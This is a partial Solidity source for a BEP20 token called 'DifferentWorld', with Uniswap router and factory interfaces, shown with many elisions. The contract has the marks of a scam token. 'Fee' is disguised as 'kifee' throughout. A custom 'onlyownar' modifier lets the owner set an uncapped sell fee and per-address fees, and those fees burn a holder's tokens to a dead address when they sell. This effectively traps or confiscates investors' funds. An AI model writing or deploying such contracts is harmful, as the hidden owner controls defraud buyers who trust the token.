...
interface IUniswapV2Factory {
    ...
    function kifeeTo() external view returns (address);
    function kifeeToSetter() external view returns (address);
    ...
    function setkifeeTo(address) external;
    function setkifeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkifeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkifeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkifeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkifeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkifeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract DifferentWorld is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkifee = 0;

    uint256 private _defaultBuykifee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkifee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkifee = _value;
    }

    function setSlipkifee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkifee[_address] = _value;
    }

    function getSlipkifee(address _address) external view onlyownar returns (uint256) {
        return _slipkifee[_address];
    }


    function setMAccountkifee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkifee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekifeeAmount = 0;

        if (rF) {
            uint256 tradekifee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekifee = _defaultSellkifee;
                }
                if (from == uniswapV2Pair) {

                    tradekifee = _defaultBuykifee;
                }
            }
            if (_slipkifee[from] > 0) {
                tradekifee = _slipkifee[from];
            }

            tradekifeeAmount = _Amount.mul(tradekifee).div(100);
        }


        if (tradekifeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekifeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekifeeAmount);
            emit Transfer(from, _deadAddress, tradekifeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekifeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekifeeAmount);
        emit Transfer(from, _to, _Amount - tradekifeeAmount);
    }
